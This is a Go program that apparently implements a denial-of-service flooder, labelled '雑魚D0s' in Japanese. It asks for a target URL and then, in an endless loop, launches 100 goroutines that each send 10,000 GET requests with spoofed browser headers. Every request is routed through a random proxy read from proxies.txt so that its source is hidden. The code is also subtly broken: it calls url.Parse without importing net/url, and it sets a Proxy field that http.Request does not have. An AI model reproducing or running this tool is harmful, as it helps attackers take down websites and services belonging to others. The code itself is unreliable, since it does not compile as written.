package main

import (
    "fmt"
    "sync"
    "net/http"
    "os"
    "bufio"
    "time"
    "math/rand"
)
var(
    reqGroup sync.WaitGroup
    subGroup sync.WaitGroup
)






func LoadProxies() ([]string, error) {
    file, err := os.Open("proxies.txt")
    if err != nil {
        return nil, err
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    var proxies []string

    for scanner.Scan() {
        proxies = append(proxies, scanner.Text())
    }

    if err := scanner.Err(); err != nil {
        return nil, err
    }

    return proxies, nil
}

func GetRandomProxy(proxies []string) (string, error) {
    rand.Seed(time.Now().UnixNano())
    randomIndex := rand.Intn(len(proxies))
    
    return proxies[randomIndex], nil
}



func sub(i int,url string) {
    defer reqGroup.Done()
    req, err := http.NewRequest("GET", url, nil)
    if err != nil {
        return
    }
    header := http.Header{}
    header.Add("Pragma", "no-cache")
    header.Add("Accept", "*/*")
    header.Add("Accept-Language", "en-US")
    header.Add("Accept-Encoding", "gzip, deflate")
    header.Add("User-Agent", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36")
    header.Add("Sec-Fetch-Dest", "empty")
    header.Add("Sec-Fetch-Mode", "cors")
    header.Add("Sec-Fetch-Site", "same-origin")
    req.Header = header
    proxies, err := LoadProxies()
    if err != nil {
        return
    }

    randomProxy, err := GetRandomProxy(proxies)
    if err != nil {
        return
    }
    proxyURL, _ := url.Parse(randomProxy)
    proxy := http.ProxyURL(proxyURL)
    req.Proxy = proxy
    resp, err := http.DefaultClient.Do(req)
    if err != nil {
	       return
    }
    defer resp.Body.Close()
    fmt.Println(i,"回目のアクセスです")
}

func sub_thread(url string) {
    defer subGroup.Done()
    reqGroup.Add(10000)
    for i := 0; i < 10000; i++{
        go sub(i,url)
    }
    reqGroup.Wait()
}

func main() {
    fmt.Println("雑魚D0s\nURLを入力してね")
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    input := scanner.Text()
    for {
        subGroup.Add(100)
        for i := 0; i < 100; i++{
            go sub_thread(input)
        }
        subGroup.Wait()
    }
}
